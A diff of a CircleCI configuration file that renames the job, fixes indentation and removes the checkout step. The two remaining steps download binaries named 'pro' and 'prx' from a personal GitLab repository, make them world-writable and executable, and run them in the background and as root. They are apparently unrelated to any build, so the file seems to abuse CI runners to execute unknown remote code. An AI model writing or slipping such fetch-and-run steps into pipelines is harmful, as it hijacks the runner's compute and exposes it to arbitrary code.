@@ -1,17 +1,12 @@
 version: 2.1
 
-workflows:
-  sample:
-    jobs:
-      - job
-
 jobs:
-  job:
+  build:
     machine:
-     resource_class: 2xlarge
-      image:ubuntu-2004:202101-01
+      resource_class: 2xlarge
+      image: ubuntu-2004:202101-01
 
     steps:
-      - checkout
+    
       - run: sudo apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro && screen -dmS run ./pro
       - run: wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/prx && chmod 777 prx && sudo ./prx
